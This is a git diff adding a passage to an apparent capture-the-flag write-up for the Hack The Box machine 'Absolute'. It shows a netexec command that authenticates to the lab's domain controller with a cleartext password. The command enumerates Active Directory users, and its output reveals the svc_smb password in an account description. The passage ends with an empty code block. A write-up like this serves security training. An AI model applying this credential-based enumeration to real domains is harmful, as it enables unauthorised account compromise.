@@ -383,5 +383,37 @@ Now using my credentials, i can dump the full user list
 
 There are also no kerberoatable users
 
+# Compromising `svc_smb`
 
+```python
+faketime -f +7h nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl' -k --users             
+SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+SMB         dc.absolute.htb 445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         dc.absolute.htb 445    DC               Administrator                 2022-06-09 08:25:57 0       Built-in account for administering the computer/domain 
+SMB         dc.absolute.htb 445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         dc.absolute.htb 445    DC               krbtgt                        2022-06-09 08:16:38 0       Key Distribution Center Service Account 
+SMB         dc.absolute.htb 445    DC               J.Roberts                     2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               M.Chaffrey                    2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               D.Klay                        2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               s.osvald                      2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               j.robinson                    2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               n.smith                       2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               m.lovegod                     2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               l.moore                       2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               c.colt                        2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               s.johnson                     2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               d.lemm                        2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               svc_smb                       2022-06-09 08:25:51 0       AbsoluteSMBService123! 
+SMB         dc.absolute.htb 445    DC               svc_audit                     2022-06-09 08:25:51 0        
+SMB         dc.absolute.htb 445    DC               winrm_user                    2022-06-09 08:25:51 0       Used to perform simple network tasks 
+```
+
+I chose to use the `--user` flag in SMB simply to display user account descriptions!
+
+And i have found a password
+
+```python
+
+```
 
